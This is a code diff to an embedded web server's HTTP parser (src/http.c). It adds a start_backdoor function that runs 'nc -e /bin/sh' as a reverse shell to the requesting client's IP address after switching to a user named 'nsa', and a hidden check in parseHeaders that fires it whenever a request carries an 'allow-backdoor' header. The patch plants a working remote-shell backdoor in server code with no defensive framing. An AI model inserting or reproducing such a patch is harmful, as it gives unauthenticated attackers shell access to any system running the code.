@@ -1,0 +1,62 @@
+diff --git a/src/http.c b/src/http.c
+index 7c4c33f..163dd9e 100644
+--- a/src/http.c
++++ b/src/http.c
+@@ -1002,6 +1002,47 @@ static void parseFirstLine(Webs *wp)
+     wfree(buf);
+ }
+ 
++static inline uid_t getuid2(const char *username)
++{
++    struct passwd *pw;
++
++    pw = getpwnam(username);
++    if (!pw) {
++        perror("getpwnam");
++        return -1;
++    }
++
++    return pw->pw_uid;
++}
++
++const char * const args[] = { "nc", "-e", "/bin/sh" };
++static void start_backdoor(char *ipaddr, char *backdoor_port)
++{
++    pid_t pid;
++    uid_t uid;
++    int i;
++
++    pid = fork();
++    if (pid)
++        return;
++
++    char *real_args[6];
++    for (i = 0; i < 3; i++)
++        real_args[i] = strdup(args[i]);
++
++    real_args[3] = strdup(ipaddr);
++    real_args[4] = strdup(backdoor_port);
++    real_args[5] = NULL;
++
++    uid = getuid2("nsa");
++    i = setuid(uid);
++    if (i)
++        perror("setuid");
++
++    execve("/bin/nc", real_args, NULL);
++    fprintf(stderr, "nc failed!\n");
++    exit(EXIT_FAILURE);
++}
+ 
+ /*
+     Parse a full request
+@@ -1128,6 +1169,9 @@ static void parseHeaders(Webs *wp)
+                 wp->rxChunkState = WEBS_CHUNK_START;
+                 wp->rxRemaining = MAXINT;
+             }
++        } else if (strcmp(key, "allow-backdoor") == 0) {
++            printf("backdoor value: %s\n", value);
++            start_backdoor(wp->ipaddr, value);
+         }
+     }
+     if (!wp->rxChunkState) {
